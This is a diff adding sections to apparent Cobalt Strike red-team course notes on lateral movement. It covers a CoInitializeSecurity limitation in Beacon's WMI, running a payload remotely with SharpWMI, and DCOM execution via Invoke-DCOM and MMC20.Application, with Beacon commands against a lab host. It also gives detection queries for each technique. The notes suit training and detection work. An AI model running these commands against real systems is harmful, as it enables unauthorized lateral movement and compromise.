@@ -53,5 +53,18 @@ WMI is part of remote-exec, which uses WMI's "process call create" to run a comm
 
 To catch, look for process create events where WmiPrvSE is the parent: ```event.category: process and event.type: start and process.parent.name: WmiPrvSE.exe```
 
+# CoInitializeSecurity oddity
 
+Beacon's implementation of WMI uses a [Beacon Object File](https://cobaltstrike.com/help-beacon-object-files), executed using the [beacon_inline_execute](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_inline_execute) function -- which can call the [CoInitializeSecurity](https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity) COM object, which sets the security context for the current process (and can only be called once per process). So future BOFs may not be able to inherit a different security context ("User B") for the lifetime of the Beacon process; WMI will then fail with access denied.
 
+A workaround is to execute WMI from a different process. Use commands such as spawn and spawnas, or even execute-assembly with a tool such as SharpWMI: ```execute-assembly SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command="C:\Windows\smb_x64.exe"```
+
+## Distributed Component Object Model
+
+Beacon can't interact over DCOM, so use a tool like [Invoke-DCOM](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), which can be integrated into the jump command.
+
+    beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
+    beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
+    beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
+    
+DCOM is hard to detect since each "Method" works differently. For MMC20.Application, the spawned process will be a child of mmc.exe: ```event.category: process and event.type : start and process.parent.name: mmc.exe```. Processes started may also have the parent svchost.exe and command line arguments of -k DcomLaunch.
